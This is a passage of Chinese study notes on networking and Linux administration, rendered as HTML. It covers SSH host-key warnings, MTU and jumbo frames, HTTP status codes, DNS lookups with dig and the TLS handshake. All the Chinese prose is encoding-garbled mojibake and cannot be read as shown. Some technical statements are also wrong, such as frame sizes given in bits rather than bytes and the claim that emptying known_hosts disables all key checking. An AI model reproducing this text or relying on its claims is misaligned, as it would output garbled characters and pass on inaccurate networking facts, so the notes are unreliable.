æ¯å€‹Serveréƒ½æœƒæœ‰Fingerprintï¼Œä¸åŒserveræˆ–serveré‡æ–°é…ç½®å‰‡fingerprintå‰‡ä¸åŒ<br>  ç•¶æˆåŠŸç™»å…¥ï¼Œå‰‡é›»è…¦æœƒä¿å­˜fingerprintä¾†ç‚ºä¸‹ä¸€æ¬¡é€£æ¥åšæ¯”è¼ƒï¼Œè‹¥fingerprintä¸åŒ¹é…å‰‡æœƒè·³å‡ºé€™ç¨®è­¦å‘Š<ul><li>å¦‚æœç¢ºå®šæœ‰é‡æ–°è¨­å®šserverå‰‡å¯ä»¥å¿½ç•¥é€™å€‹è­¦å‘Š</li><li>å¯ä»¥åœ¨ <strong>~&#x2F;.ssh&#x2F;known_hosts</strong> åˆªé™¤entryï¼Œæˆ–æ¸…ç©ºæ–‡ä»¶ï¼Œé€™å°‡æœƒé—œé–‰æ‰€æœ‰å¯†é‘°æª¢æŸ¥</li></ul></li><li><strong>Your SSH Key File Mode Issues</strong><ul><li>ä½œç‚ºä¿è­· SSH Keyæª”æ¡ˆçš„æ¬Šé™æ‡‰è©²è¦æ˜¯0600(Owner R+W)æˆ–0400(Owner R)<br>  <img src="https://i.imgur.com/F9O86LG.png"></li></ul></li></ul></li><li>SSHä¸­è¦å¦‚ä½•å•Ÿç”¨ç„¡å¯†ç¢¼èªè­‰?<ul><li>è‡³<code>/etc/ssh/sshd_config</code> ä¸­ä¿®æ”¹è¨­å®š  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication no</span><br><span class="line">PubkeyAuthentication yes</span><br></pre></td></tr></table></figure></li></ul></li><li>è¬›è§£ä¸€ä¸‹Pingè·ŸTracertæŒ‡ä»¤æ˜¯æ€éº¼é‹ä½œçš„?<br>  <img src="https://i.imgur.com/Kog8FV8.png"><ul><li>Ping: å‘ç‰¹å®šç›®æ¨™ç™¼é€ICMP Echo Requestä»¥ç¢ºèªå°ç›®çš„ç«¯çš„é€šè¨Šç‹€æ…‹<ul><li>å¯ä»¥æ ¹æ“špingè¿”å›çš„TTLå€¼ä¾†åˆ¤æ–·å°æ–¹æ‰€ä½¿ç”¨çš„æ“ä½œç³»çµ±åŠæ•¸æ“šåŒ…ç¶“éè·¯ç”±å™¨æ•¸é‡</li></ul></li><li>Tracert: å–„ç”¨å›æ‡‰é€¾æ™‚çš„éŒ¯èª¤ä»¥æŸ¥è©¢åˆ°ç›®çš„åœ°çš„è·¯å¾‘</li></ul></li><li><a href="https://www.361way.com/linux-mtu-jumbo-frames/4055.html">Linuxåº•ä¸‹è¦æ€éº¼ä¿®æ”¹MTUå€¼?</a></li><li>ç”šéº¼æ˜¯Jumbo Frame?<ul><li>ç‚ºæ¯”æ¨™æº–Ethernet Frameé‚„å¤§çš„Frameï¼Œæ¯”1518&#x2F;1522 bitå¤§çš„frame</li><li>åªèƒ½åœ¨full-duplexçš„ä¹™å¤ªç¶²è·¯ä¸­é‹è¡Œ</li><li>æ¨™æº–Ethernet IPè¨Šæ¯å¤§å°æ˜¯: 1500Bitï¼Œè‹¥åŒ…å«Ethernet Headerä»¥åŠFCS(6+6+2+4)æ˜¯1518bit</li><li>Jumbo frameæŒ‡çš„æ˜¯å…©å±¤å°è£ä¸‰å±¤IP Messageçš„å€¼å¤§æ–¼9000bitçš„Message</li><li>è‹¥ä½¿ç”¨ä¸€èˆ¬1500Bitçš„frameï¼Œframeè¶Šå°ï¼Œå‚³è¼¸å°åŒ…é‡è¶Šå¤§ï¼Œè¨ˆç®—é‡è¶Šå¤šï¼Œå‰‡:<ul><li>å¢åŠ Hostçš„è¨ˆç®—é‡ï¼Œæ¶ˆè€—CPUè³‡æº</li><li>å½±éŸ¿ç¶²è·¯å‚³è¼¸é€Ÿåº¦</li><li>æ‰€ä»¥åŠ å¤§frameå¯ä»¥é™ä½CPUè¨ˆç®—é‡ä¸¦åŠ å¿«å‚³è¼¸é€Ÿåº¦</li></ul></li></ul></li><li>å¦‚ä½•ä¿®æ”¹frameå¤§å°(å¦‚ä½•å‰µé€ Jumbo Frame?)<ul><li>ä¿®æ”¹MTU(Maximum Transmission Unit)å€¼ </li><li><ol><li><code>ifconfig $&#123;Interface&#125; mtu $&#123;SIZE&#125; up</code></li></ol></li><li>ex. <code>ifconfig eth1 mtu 9000 up</code></li><li>ä½†é€™æ¨£é‡å•Ÿéœ€è¦é‡æ–°è¨­å®š</li><li><ol start="2"><li>ä¿®æ”¹configæª”æ¡ˆ</li></ol></li><li>Ubuntu&#x2F;Debianåº•ä¸‹æ˜¯åœ¨ &#x2F;etc&#x2F;network&#x2F;interfacesåº•ä¸‹</li><li>æ–°å¢ <code>mtu 9000</code></li><li>é‡å•Ÿæœå‹™ <code>/etc/init.d/network-manager restart</code></li><li><strong>ç¶“éäº¤æ›ç¶²è·¯è¨­å®šæ™‚ï¼Œåƒ…ä¿®æ”¹Hostç«¯çš„MTUå€¼ä¸å¤ªè¡Œï¼Œé‚„çºŒé‘°æª¢æŸ¥ç¶²è·¯è¨­å‚™æœ‰ç„¡å•Ÿç”¨jumbo framesåŠŸèƒ½</strong></li></ul></li><li>æ¸¬è©¦MTU<ul><li><code>ping -l 9000 -f &lt;domain&gt;</code></li><li>-f åƒæ•¸å‘Šè¨´ä½œæ¥­ç³»çµ±ä¸èƒ½ç§è‡ªæ›´æ”¹å°åŒ…å¤§å°</li></ul></li><li>è¬›è§£ä¸€ä¸‹Emailçš„é€šè¨ŠåŸç†<ul><li>ç•¶è¼¸å…¥Emailæ™‚ï¼Œâ€@â€å¾Œé¢å³ç‚ºDomain Name<blockquote><p><a href="http://linux.vbird.org/linux_server/0380mail.php#whatmail_dns">http://linux.vbird.org/linux_server/0380mail.php#whatmail_dns</a><br><a href="https://weils.net/blog/2017/04/19/how-email-works-dkim-all-in-one/">https://weils.net/blog/2017/04/19/how-email-works-dkim-all-in-one/</a><br><a href="https://docs.digitalocean.com/support/how-to-troubleshoot-ssh-connectivity-issues/">https://docs.digitalocean.com/support/how-to-troubleshoot-ssh-connectivity-issues/</a><br><a href="https://www.linux.com/topic/networking/4-reasons-why-ssh-connection-fails/">https://www.linux.com/topic/networking/4-reasons-why-ssh-connection-fails/</a><br><a href="https://help.skysilk.com/support/solutions/articles/9000150151-how-to-troubleshoot-ssh-connection-issues-using-vnc-console">https://help.skysilk.com/support/solutions/articles/9000150151-how-to-troubleshoot-ssh-connection-issues-using-vnc-console</a></p></blockquote></li></ul></li><li>DNSè¨­å®šå¤±æ•—æœƒæ€éº¼è§£æ±º?<blockquote><p><a href="https://www.digitalocean.com/community/tutorial_series/an-introduction-to-managing-dns">https://www.digitalocean.com/community/tutorial_series/an-introduction-to-managing-dns</a> </p></blockquote></li><li>å¯ä»¥è¬›è§£ä¸€ä¸‹HTTPå”å®šé‹ä½œåŸç†å—?<br>  <img src="https://i.imgur.com/kwU3Ay7.png"><ul><li>é€šå¸¸ç”±ä½¿ç”¨è€…é€éç€è¦½å™¨æˆ–çˆ¬èŸ²ä¾†å°Serverç«¯ç™¼å‡ºè«‹æ±‚</li><li>é‚£å…¶ä¸­æˆ‘å€‘æœƒç¨±é€™å€‹clientç‚ºUser Agentï¼Œä¸€å€‹ä»£ç†ç¨‹å¼</li><li>è€Œè«‹æ±‚çš„Serverä¸Šå¯èƒ½ä¹Ÿæœƒæœ‰ä¸€äº›åƒæ˜¯HTMLæª”æ¡ˆæˆ–åœ–åƒä¹‹é¡çš„è³‡æº</li><li>ç•¶HTTP Clientç™¼å‡ºè«‹æ±‚ï¼Œå»ºç«‹ä¸€å€‹åˆ°Serverç«¯æŒ‡å®šport(é è¨­æ˜¯80)çš„TCPé€£ç·š</li><li>å‰‡HTTP Serverå‰‡æœƒåœ¨é‚£å€‹portç›£è½clientçš„è«‹æ±‚</li><li>ä¸€æ—¦æ”¶åˆ°è«‹æ±‚ï¼ŒServeræœƒå‘Clientè¿”å›ä¸€å€‹ç‹€æ…‹ ex. â€œHTTP&#x2F;1.1 200 OKâ€ï¼Œä»¥åŠè¿”å›å…§å®¹æˆ–éŒ¯èª¤è¨Šæ¯ç­‰ç­‰è³‡è¨Š</li><li>HTTPåœ¨1.1ä¸­åŠ å…¥äº†ä¿æŒé€£ç·šçš„æ©Ÿåˆ¶ï¼Œä¸€å€‹é€£æ¥å¯ä»¥é‡è¤‡åœ¨å¤šå€‹è«‹æ±‚&#x2F;å›æ‡‰ä½¿ç”¨</li><li>å¯ä»¥æ¸›å°‘ç­‰å¾…æ™‚é–“</li></ul></li><li>é‚£HTTPSå‘¢?<ul><li>å°±æ˜¯åœ¨é€²è¡ŒHTTPé€£ç·šä¹‹å‰æœƒå…ˆé€²è¡ŒTLS&#x2F;SSL Handshake</li></ul></li><li>ä½ çŸ¥é“çš„HTTPç‹€æ…‹ç¢¼æœ‰å“ªäº›?<ul><li>2xx<br>  <img src="https://i.imgur.com/KWTpmAh.png"></li><li>3xx<br>  <img src="https://i.imgur.com/zShTVKk.png"></li><li>400 - Bad Request : ä»£è¡¨é€åˆ°Serverçš„HTTP Requestèªæ³•æœ‰èª¤æˆ–ç„¡æ•ˆ<ul><li>æª¢æŸ¥: </li><li><ol><li>URLä¸­çš„éŒ¯èª¤</li></ol></li><li><ol start="2"><li>èˆ‡è©²ç¶²ç«™çš„cookieå¯èƒ½æ¯€æï¼Œæ¸…é™¤ç€è¦½å™¨çš„cookieä»¥åŠcache</li></ol></li><li><ol start="3"><li>å˜—è©¦åœ¨ä¸åŒçš„webç€è¦½å™¨ä¸Šæ‰“é–‹ç›¸åŒçš„ç¶²é </li></ol></li></ul></li><li>401 - Unauthorized: ä»£è¡¨ä½¿ç”¨è€…åœ¨æœªç¶“èº«åˆ†èªè­‰çš„æƒ…æ³ä¸‹å˜—è©¦å­˜å–è³‡æºï¼Œè€Œç”¨æˆ¶å¿…é ˆæä¾›credentialæ‰å¯ä»¥æŸ¥çœ‹å—ä¿è­·çš„è³‡æº<ul><li>æª¢æŸ¥:</li><li><ol><li>æª¢æŸ¥URLéŒ¯èª¤ï¼Œè‹¥URLæœ‰æ•ˆï¼Œå‰‡å­˜å–ä¸»é ä¸¦ç™»å…¥ï¼Œè¼¸å…¥è³‡è¨Šï¼Œç„¶å¾Œé‡è©¦</li></ol></li><li><ol start="2"><li>ç€è¦½å™¨ä¹Ÿå¯èƒ½å¿«å–åˆ°ç„¡æ•ˆè³‡è¨Šï¼Œå› æ­¤å¯ä»¥æ¸…é™¤å¿«å–</li></ol></li></ul></li><li>403 - Forbidden: ç™¼ç”Ÿåœ¨ç”¨æˆ¶ç™¼å‡ºæœ‰æ•ˆè«‹æ±‚ä½†Serverç”±æ–¼ç¼ºä¹å­˜å–è³‡æºçš„æ¬Šé™è€Œæ‹’çµ•æœå‹™æ™‚<ul><li>æª¢æŸ¥: </li><li><ol><li>ç¢ºä¿Serverä¸­ &#x2F;www è³‡æ–™çš„å­˜å–æ¬Šé™æ˜¯æ­£ç¢ºçš„</li></ol></li><li><ol start="2"><li>æª¢æŸ¥ .htaccess è¨­å®š(.htaccess æ–‡ä»¶æ§åˆ¶å°è³‡æºçš„å­˜å–)</li></ol></li><li><ol start="3"><li>è‹¥ç¶²ç«™æ²’æœ‰indexæ–‡ä»¶ï¼Œä¹Ÿæœ‰å¯èƒ½ç™¼ç”Ÿé€™ç¨®æƒ…æ³ï¼Œé€™æ¨£é ˆå°‡ä¸»é é‡æ–°å‘½åç‚ºindex.html&#x2F;index.php</li></ol></li><li><ol start="3"><li>èˆ‡ç¶²ç«™ç®¡ç†å“¡è¯ç¹«å·²å–å¾—å­˜å–æ¬Šé™ (æ‡‰å°‡æ¬Šé™è¨­ç‚ºè®€å–)</li></ol></li><li><ol start="4"><li>è‹¥å…¶ä»–ç”¨æˆ¶å¯ä»¥å­˜å–ï¼Œå‰‡éœ€è¦è¯çµ¡ISPä¾†è§£æ±ºé€™å€‹å•é¡Œ</li></ol></li></ul></li><li>404 - Not Found: ä»£è¡¨ç”¨æˆ¶å¯èˆ‡Serveré€šè¨Šï¼Œä½†ç„¡æ³•å®šä½æ‰€è«‹æ±‚çš„è³‡æº<ul><li>æª¢æŸ¥:</li><li><ol><li>ä¸€æ¨£URLæœ‰æ²’æœ‰éŒ¯</li></ol></li><li><ol start="2"><li>F5æ›´æ–°ç¶²é </li></ol></li><li><ol start="3"><li>æ¸…é™¤ç€è¦½å™¨å¿«å–</li></ol></li><li><ol start="4"><li>ä¿®æ”¹DNS Serverè¨­å®š</li></ol></li></ul></li><li>500 - Internal Server Error: é€™ä»£è¡¨ç¶²ç«™Serverå‡ºç¾å•é¡Œï¼ŒServerç„¡æ³•åµæ¸¬ç¢ºåˆ‡å•é¡Œï¼Œä½†clientç«¯é‚„æ˜¯èƒ½å¤ å˜—è©¦ä»¥ä¸‹æ­¥é©Ÿ<ul><li>æª¢æŸ¥:</li><li><ol><li>ç¶²è·¯æµé‡é«˜ï¼ŒæŒ‰ä¸‹F5ï¼Œé‡æ–°è¼‰å…¥ç¶²é </li></ol></li><li><ol start="2"><li>æ¸…é™¤ç¶²è·¯ç€è¦½å™¨å¿«å–å’Œcookie</li></ol></li><li><ol start="3"><li>æª¢æŸ¥ç¶²ç«™çš„ .htaccessæ–‡ä»¶è¢«æ­£ç¢ºå»ºç«‹</li></ol></li><li><ol start="4"><li>æª¢æŸ¥æ–‡ä»¶å’Œè³‡æ–™å¤¾æ˜¯å¦æœ‰ä»»ä½•ä¸æ­£ç¢ºçš„æ¬Šé™</li></ol></li></ul></li><li>502 - Bad Gateway: ä»£è¡¨Serverå……ç•¶gatewayæˆ–proxyï¼Œç„¡æ³•å¾ä¸Šæ¸¸Serverç²å¾—æœ‰æ•ˆçš„Responseï¼Œé€™ä¹Ÿæœ‰å¯èƒ½æ˜¯ç”±æ–¼DNSå•é¡Œæ‰€é€ æˆçš„<ul><li>æª¢æŸ¥:</li><li><ol><li>F5éµï¼Œé‡æ–°è¼‰å…¥ç¶²é </li></ol></li><li><ol start="2"><li>é—œé–‰æ‰€æœ‰æ‰“é–‹çš„ç€è¦½å™¨ä¸¦å•Ÿå‹•æ–°çš„ç€è¦½å™¨Session</li></ol></li><li><ol start="3"><li>æ¸…ç©ºç€è¦½å™¨å¿«å–</li></ol></li><li><ol start="4"><li>æš«æ™‚ç¦ç”¨CDN(Content Delivery Network)</li></ol></li><li><ol start="5"><li>é‡å•Ÿç¶²è·¯è¨­å‚™(modem, router etc.)</li></ol></li></ul></li><li>503 - Service Unavailable: é€™ä»£è¡¨serverè² è¼‰éå¤§ï¼Œæˆ–æ­£åœ¨ç¶­è­·ä¸­<ul><li>æª¢æŸ¥:</li><li><ol><li>F5éµï¼Œé‡æ–°è¼‰å…¥ç¶²é </li></ol></li><li><ol start="2"><li>é‡å•Ÿç¶²è·¯è¨­å‚™(modem, router etc.)</li></ol></li></ul></li><li>504 - Gateway Timeout: ä»£è¡¨Serveræ˜¯Gatewayæˆ–proxyï¼Œåœ¨å…è¨±çš„æ™‚é–“å…§ç„¡æ³•å¾å¾Œç«¯serverç²å¾—response<ul><li>æª¢æŸ¥:</li><li><ol><li>F5éµï¼Œé‡æ–°è¼‰å…¥ç¶²é </li></ol></li><li><ol start="2"><li>é‡å•Ÿç¶²è·¯è¨­å‚™(modem, router etc.)</li></ol></li><li><ol start="3"><li>è®Šæ›´DNS Server(è‹¥ä½ ç¶²è·¯ä¸­çš„æ‰€æœ‰è¨­å‚™éƒ½æ”¶åˆ°ç›¸åŒéŒ¯èª¤)</li></ol></li><li><ol start="4"><li>ä»ç„¶æœ‰éŒ¯èª¤å¯èƒ½è¦è¯çµ¡ç¶²ç®¡æˆ–ISP</li></ol></li></ul></li></ul></li><li>å¯ä»¥è¬›è§£ä¸€ä¸‹SMTPé‹ä½œåŸç†å—?</li><li>å¯ä»¥è¬›è§£ä¸€ä¸‹DNSçš„é‹ä½œåŸç†?<ul><li>æœ‰åˆ†æˆå…©ç¨®ï¼Œä¸€ç¨®æ˜¯æˆæ¬Šå‹DNSå¦ä¸€ç¨®æ˜¯éè¿´å‹server</li><li>æˆæ¬Šå‹æœƒæ¥æ”¶ä¸¦å›æ‡‰DNSæŸ¥è©¢æœå‹™ï¼Œä¸€å±¤ä¸€å±¤æ‰¾åˆ°root DNS Server</li><li>éè¿´å‹å‰‡æœ¬èº«æ²’æœ‰DNS Recordï¼Œä½†å®ƒæœƒå°‡è«‹æ±‚å‚³éçµ¦æˆæ¬ŠDNS Serverå»å–å¾—IPä½å€</li><li>é‹ä½œæµç¨‹:<ul><li>ç•¶è¼¸å…¥<a href="http://www.ntust,edu.tw/">www.ntust,edu.tw</a> æ™‚ï¼ŒDNS Serveræœƒæ¥æ”¶åˆ°æŸ¥è©¢IPä½å€çš„è«‹æ±‚</li><li>DNS Serveræœƒé–‹å§‹æŸ¥è©¢<a href="http://www.example.com/">www.example.com</a> çš„IPä½å€</li><li>ä¸¦æª¢æŸ¥local DNS Serverçš„Cacheä¸­æœ‰æ²’æœ‰dns record<ul><li>æœƒå» <code>/etc/resolv.conf</code> æŸ¥æ‰¾ï¼Œå°‡ç¶²åŸŸè®Šæ›´ç‚ºFQDN</li></ul></li><li>è‹¥æ²’æœ‰å‰‡æœƒå»root DNS Serverå»æŸ¥æ‰¾</li><li>root DNS Serveræœƒå»å‘ŠçŸ¥DNS Server ã€Œç®¡ç†twçš„DNS Serverã€çš„IPåœ°å€</li><li>è€Œlocal DNS Serverå–å¾—è©²IPå¾Œå°±æœƒå»ç™¼å‡ºDNSè«‹æ±‚<ul><li><code>dig tw ns +short</code></li></ul></li><li>è€Œç®¡ç†twçš„DNS Serveræœƒå»å‘Šè¨´local DNS Server ã€Œç®¡ç† edu.twçš„DNS Serverã€çš„IPä½å€<ul><li><code>dig @nameserver edu.tw ns</code></li><li><code>dig @a.dns.tw edu.tw ns +short</code></li></ul></li><li>è€Œlocal DNS Serverå–å¾—è©²IPå¾Œå°±æœƒå»ç™¼å‡ºDNSè«‹æ±‚</li><li>ç®¡ç†edu.twçš„DNS Serveræœƒå»å‘Šè¨´local DNS Server ã€Œç®¡ç†ntust.edu.twçš„DNS Serverã€çš„IPä½å€<ul><li><code>dig @nameserver ntust.edu.tw ns +short</code></li></ul></li><li>æ¥è‘—local DNS Serverå°±æœƒå»å°è©²IPä½å€ç™¼å‡ºè«‹æ±‚<ul><li><code>dig @RealAuthorieServer ntust.edu.tw a +short</code></li></ul></li><li>å‰‡ç®¡ç†ntust.edu.twçš„DNS Serveræœƒè¿”å›<a href="http://www.ntust.edu.twçš„ipä½å€/">www.ntust.edu.twçš„IPä½å€</a></li></ul></li></ul></li><li>å¯ä»¥è¬›è§£ä¸€ä¸‹TLS&#x2F;SSL Handeshakeçš„éç¨‹å—?<br>  <a href="https://www.cloudflare.com/zh-tw/learning/ssl/what-happens-in-a-tls-handshake/">https://www.cloudflare.com/zh-tw/learning/ssl/what-happens-in-a-tls-handshake/</a><br>  <img src="https://i.imgur.com/4EOqjes.png"><br>  é‹ä½œåœ¨Session Layerï¼Œä¸»è¦æœƒåœ¨é€šè¨Šé›™æ–¹äº¤æ›è³‡è¨Šä¸¦äº’ç›¸é©—è­‰ï¼Œä¸¦é€éä»–å€‘æ‰€ä½¿ç”¨çš„é€šè¨ŠåŠ å¯†æ¼”ç®—æ³•ä¸¦ç”¢ç”Ÿä¸€è‡´çš„å·¥ä½œé‡‘é‘°<ul><li>TLS æ¡æ‰‹ä»€éº¼æ™‚å€™ç™¼ç”Ÿï¼Ÿ<ul><li>ç”¨æˆ¶å°èˆªåˆ°ä¸€å€‹ä½¿ç”¨ HTTPS çš„ç¶²ç«™ï¼Œç€è¦½å™¨é¦–å…ˆé–‹å§‹æŸ¥è©¢ç¶²ç«™çš„åŸå§‹ä¼ºæœå™¨ï¼Œé€™æ™‚å°±æœƒç™¼ç”Ÿ TLS æ¡æ‰‹ã€‚</li><li>åœ¨ä»»ä½•å…¶ä»–é€šä¿¡ä½¿ç”¨HTTPSæ™‚ï¼ˆåŒ…æ‹¬ API èª¿ç”¨å’Œ DNS over HTTPS æŸ¥è©¢ï¼‰ï¼Œä¹Ÿæœƒç™¼ç”Ÿ TLS æ¡æ‰‹ã€‚</li><li>é€šé TCP Handshake æ‰“é–‹ TCP é€£æ¥å¾Œï¼Œå°‡ç™¼ç”Ÿ TLS Handshake</li></ul></li><li>TLS Handshakeéç¨‹ä¸­ç™¼ç”Ÿå•¥äº‹?<ul><li>clientèˆ‡serverä¹‹é–“æœƒé€²è¡Œä»¥ä¸‹æ“ä½œ:<ul><li>æŒ‡å®šTLSç‰ˆæœ¬(TLS 1.0ã€1.2ã€1.3)</li><li>æ±ºå®šæ‰€ä½¿ç”¨çš„å¯†ç¢¼å­¸å¥—ä»¶</li><li>é€éServerçš„å…¬é–‹å¯†é‘°å’ŒSSLæ†‘è­‰é ’ç™¼æ©Ÿæ§‹çš„é›»å­ç°½ç« å»é©—è­‰Serverçš„èº«åˆ†</li><li>ç”Ÿæˆå·¥ä½œéšæ®µé‡‘é‘°ï¼Œä»¥ä¾¿åœ¨æ¡æ‰‹å®Œæˆå¾Œä½¿ç”¨å°ç¨±åŠ å¯†</li></ul></li></ul></li><li>TLS Handshakeçš„æ­¥é©Ÿæ˜¯ç”šéº¼?<ul><li>å…·é«”æ­¥é©Ÿæœƒéš¨è‘—ä½¿ç”¨çš„é‡‘é‘°äº¤æ›æ¼”ç®—æ³•çš„ä¸åŒè€Œä¸åŒ</li><li>æœ€å¸¸ç”¨çš„æ˜¯<strong>RSA</strong>é‡‘é‘°äº¤æ›æ¼”ç®—æ³•<ul><li><strong>Client Hello:</strong><ul><li>clientå°serverç™¼å‡ºhelloæ¶ˆæ¯ä¾†é€²è¡ŒHandshakeï¼Œå…¶ä¸­åŒ…å«äº†ç”¨æˆ¶ç«¯æ”¯æ´çš„TLSç‰ˆæœ¬ï¼Œæ”¯æ´çš„å¯†ç¢¼å¥—ä»¶ã€ä»¥åŠä¸€å€‹clientéš¨æ©Ÿäº‚æ•¸</li></ul></li><li><strong>Server Hello:</strong><ul><li>å›è¦†client helloï¼Œserverå›å‚³è¨Šæ¯ä¸­åŒ…å«:</li><li>SSLæ†‘è­‰ <code>é€™æ˜¯å“ªä¾†çš„?æ€éº¼ç”¢ç”Ÿçš„?</code></li><li>ä¼ºæœå™¨é¸æ“‡çš„å¯†ç¢¼å¥—ä»¶</li><li>serveréš¨æ©Ÿäº‚æ•¸</li></ul></li><li><strong>èº«åˆ†èªè­‰</strong><ul><li>clientç«¯ä½¿ç”¨é ’ç™¼è©²æ†‘è­‰çš„æ†‘è­‰æˆæ¬Šé©—è­‰ä¼ºæœå™¨çš„ SSL æ†‘è­‰</li><li>æ­¤èˆ‰ç¢ºèªServeræ˜¯å…¶è²ç¨±çš„èº«ä»½ï¼Œä¸”clientæ­£åœ¨èˆ‡è©²domainçš„å¯¦éš›æ‰€æœ‰è€…é€²è¡Œäº’å‹•</li></ul></li><li><strong>premaster secret</strong><ul><li>clientç«¯å†ç™¼é€ä¸€ä¸²éš¨æ©Ÿä½å…ƒçµ„ï¼Œå³premaster secret</li><li>premaster secretä½¿ç”¨å…¬é–‹é‡‘é‘°åŠ å¯†(æ˜¯clientå¾SSLæ†‘è­‰ä¸­å–å¾—å…¬é‘°ï¼Œä¾†é€²è¡ŒåŠ å¯†çš„)</li><li>åªèƒ½ä½¿ç”¨serverçš„secret keyé€²è¡Œè§£å¯†</li></ul></li><li><strong>secret keyè¢«ä½¿ç”¨</strong><ul><li>serveré€éç§é‘°å°premaster secreté€²è¡Œè§£å¯†</li></ul></li><li><strong>ç”Ÿæˆå·¥ä½œéšæ®µé‡‘é‘°</strong><ul><li>client èˆ‡ serverç«¯å‡ä½¿ç”¨clientäº‚æ•¸ã€serveräº‚æ•¸å’Œpremaster secretå»ç”Ÿæˆå·¥ä½œéšæ®µé‡‘é‘°</li></ul></li><li><strong>clientå°±ç·’</strong><ul><li>clientæœƒç™¼é€ä¸€æ¢<strong>å·²å®Œæˆ</strong>çš„æ¶ˆæ¯</li></ul></li><li><strong>serverå°±ç·’</strong> <ul><li>serveræœƒç™¼é€ä¸€æ¢<strong>å·²å®Œæˆ</strong>çš„æ¶ˆæ¯</li></ul></li></ul></li><li>æ‰€æœ‰ TLS æ¡æ‰‹éƒ½ä½¿ç”¨éå°ç¨±åŠ å¯†ï¼ˆå…¬é–‹é‡‘é‘°å’Œç§å¯†é‡‘é‘°ï¼‰ï¼Œä½†ä¸¦ä¸æ˜¯æ‰€æœ‰çš„ TLS æ¡æ‰‹éƒ½æœƒåœ¨ç”Ÿæˆå·¥ä½œéšæ®µå¯†é‘°çš„éç¨‹ä¸­ä½¿ç”¨ç§å¯†é‡‘é‘°ã€‚ä¾‹å¦‚ï¼Œè‡¨æ™‚ <strong>Diffie-Hellman</strong> æ¡æ‰‹çš„æ­¥é©Ÿå¦‚ä¸‹ï¼š<ul><li><strong>Client Hello</strong><ul><li>åŒ…å«å”å®šç‰ˆæœ¬ã€clientäº‚æ•¸ã€å¯†ç¢¼å­¸å¥—ä»¶æ¸…å–®</li></ul></li><li><strong>Server Hello</strong><ul><li>åŒ…å«SSLæ†‘è­‰ã€é¸å®šçš„å¯†ç¢¼å¥—ä»¶ã€Serveräº‚æ•¸</li></ul></li><li><strong>serverçš„æ•¸ä½ç°½ç« </strong><ul><li>serverä½¿ç”¨å…¶ç§é‘°å°clientäº‚æ•¸ã€serveräº‚æ•¸ä»¥åŠDHåƒæ•¸é€²è¡ŒåŠ å¯†</li><li>åŠ å¯†å¾Œçš„è³‡æ–™ç”¨ä½œä¼ºæœå™¨çš„æ•¸ä½ç°½ç« </li><li>å·²ç¢ºå®šServerä¸­å…·æœ‰èˆ‡SSLæ†‘è­‰ä¸­çš„å…¬é‘°åŒ¹é…çš„ç§é‘°</li></ul></li><li><strong>Serverèˆ‡Clientè¨ˆç®—premaster secret</strong><ul><li>clientèˆ‡serverä½¿ç”¨äº¤æ›çš„DHåƒæ•¸åˆ†åˆ¥è¨ˆç®—åŒ¹é…çš„premaster secret</li><li>è€Œä¸åƒRSA Handshakeé‚£æ¨£ç”±ç”¨æˆ¶ç«¯ç”Ÿæˆpremaster secretä¸¦å°‡å…¶ç™¼é€åˆ°server</li></ul></li><li><strong>å»ºç«‹å·¥ä½œéšæ®µé‡‘é‘°</strong><ul><li>clientèˆ‡serverå¾premaster secretã€clientäº‚æ•¸ã€serveräº‚æ•¸ä¸­è¨ˆç®—å·¥ä½œéšæ®µé‡‘é‘°</li></ul></li><li><strong>clientå°±ç·’</strong><ul><li>clientæœƒç™¼é€ä¸€æ¢<strong>å·²å®Œæˆ</strong>çš„æ¶ˆæ¯</li></ul></li><li><strong>serverå°±ç·’</strong> <ul><li>serveræœƒç™¼é€ä¸€æ¢<strong>å·²å®Œæˆ</strong>çš„æ¶ˆæ¯</li></ul></li></ul></li></ul></li></ul></li><li><a href="https://segmentfault.com/a/1190000021778053">TLS Handshakeå¤±æ•—å¯èƒ½åŸå› æœƒæ˜¯ç”šéº¼?</a><ul><li>å¸¸è¦‹éŒ¯èª¤è¨Šæ¯:<code>SSL Handshake Failed error</code></li><li>å¸¸è¦‹éŒ¯èª¤åŸå› :<ul><li>å”å®šä¸åŒ¹é…  <code>serverç«¯å‡ºéŒ¯</code></li><li>åŠ å¯†å¥—ä»¶ä¸åŒ¹é… <code>serverç«¯å‡ºéŒ¯</code> â†’ Serverç«¯ä¸æ”¯æ´clientè«‹æ±‚ä½¿ç”¨çš„åŠ å¯†å¥—ä»¶</li><li>ç³»çµ±æ™‚é–“ä¸æº–ç¢º (å¯æ˜¯å‰›å‰›éç¨‹æ²’ç”¨åˆ°æ™‚é–“è³‡è¨Šé˜¿:|)</li><li>ç€è¦½å™¨è¨­å®šéŒ¯èª¤</li><li>æ†‘è­‰éŒ¯èª¤ <code>serverç«¯å‡ºéŒ¯</code><ul><li>æ†‘è­‰ä¸­çš„domain nameèˆ‡URLä¸­çš„domain nameä¸ç¬¦</li><li>æ†‘è­‰éæœŸ</li><li>æˆ–æ†‘è­‰éˆå‡ºéŒ¯</li><li>ä½¿ç”¨è‡ªç°½åçš„æ†‘è­‰</li></ul></li><li>Serverå•Ÿç”¨äº†SNI-Enabled <code>serverç«¯å‡ºéŒ¯</code></li></ul></li><li><strong>å”å®šä¸åŒ¹é…</strong><ul><li>é€é <code>tcpdump -i any -s 0 host IP address -w File name</code> åœ¨clientæˆ–serverä¸Šè’é›†è³‡è¨Š</li><li>é€éwiresharkå»åˆ†æè’é›†çš„packet</li><li>å»æ‰¾<strong>client hello</strong>æ‰€ä½¿ç”¨çš„TLSç‰ˆæœ¬</li><li>å»çœ‹Severç«¯ä¹‹å¾Œå¾ŒçºŒè™•ç†çš„éŒ¯èª¤è³‡è¨Š</li><li><a href="https://docs.apigee.com/api-platform/troubleshoot/runtime/ssl-handshake-failures">https://docs.apigee.com/api-platform/troubleshoot/runtime/ssl-handshake-failures</a></li></ul></li></ul></li><li>ç¶²ç«™æ†‘è­‰éæœŸè©²æ€éº¼è¾¦?<ul><li>å»æ›´æ–°æ†‘è­‰</li></ul></li><li>å¯ä»¥è¬›è§£ä¸€ä¸‹ç”šéº¼æ˜¯SSLå—?<ul><li>å…¨åæ˜¯Secure Soekcts Layersï¼Œç”¨ä¾†ç¢ºä¿å…©å€‹ç³»çµ±ä¹‹é–“æ‰€å‚³éçš„æ•æ„Ÿè³‡æ–™è¢«ç«„æ”¹æˆ–è®€å–</li><li>TLSå°±æ˜¯æ›´å®‰å…¨çš„SSLç‰ˆæœ¬</li></ul></li></ul><h2 id="Linux-Admin"><a 